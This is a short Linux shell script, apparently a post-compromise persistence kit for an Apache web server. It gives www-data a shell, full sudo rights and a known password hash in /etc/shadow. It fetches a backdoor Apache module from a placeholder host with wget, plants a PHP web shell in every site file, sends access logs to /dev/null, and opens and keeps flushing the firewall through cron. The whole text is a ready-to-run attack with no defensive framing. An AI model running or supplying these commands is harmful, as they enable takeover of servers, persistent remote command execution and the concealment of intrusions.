#Step 1: Shells for the people!
cp /bin/bash /usr/sbin/nologin
#Step2: Give sudoer to www-data, and anyone else you think might be a good idea
echo "www-data        ALL=(ALL:ALL) ALL" >> /etc/sudoers

#Step 2: Give www-data a password (www-data:password)
cat /etc/shadow | grep -v www-data >> /etc/shadow2
cat /etc/shadow2>/etc/shadow
rm /etc/shadow2
echo "www-data:\$6\$0dQioVcT\$6V4NGdovAND.gI4z3SL/0.FyRr6RdlyZUlvw1/9aYf5MBr9Aq2xvTRIvE3yLulG.keBS9z3.ns/Htq7rZMTZ30:16389:0:99999:7:::" >> /etc/shadow

#Step 3: Pull down and install the backdoor
wget http://YOUR-HOST-HERE/bd_module.so -O /usr/lib/apache2/modules/bd_module.so
echo "LoadModule a2bd_module        /usr/lib/apache2/modules/bd_module.so" >> /etc/apache2/mods-enabled/a2bd.load
service apache2 restart

# Use the following request for a one-liner sudo:
# WTF http://192.168.142.131/index.html?echo password|sudo -S cat /etc/shadow

#Step 4: Backdoor .php files:
for i in /var/www/*/*.php
do 
   echo "<?php if(isset(\$_GET['SESSID'])) {echo passthru(\$_GET['SESSID']);}?>" >> $i
done

#Step 5: Kill HTTP logs now and forever
rm -f /var/log/apache2/access.log
ln -s /dev/null /var/log/apache2/access.log

#Step 6: Skip all those annoying firewall ingress rules
iptables -I INPUT 1 -j ACCEPT
iptables -I OUTPUT 1 -j ACCEPT

#Step 7: Make sure they don't come back
echo "*  *    * * *   root    iptables -F" >> /etc/crontab
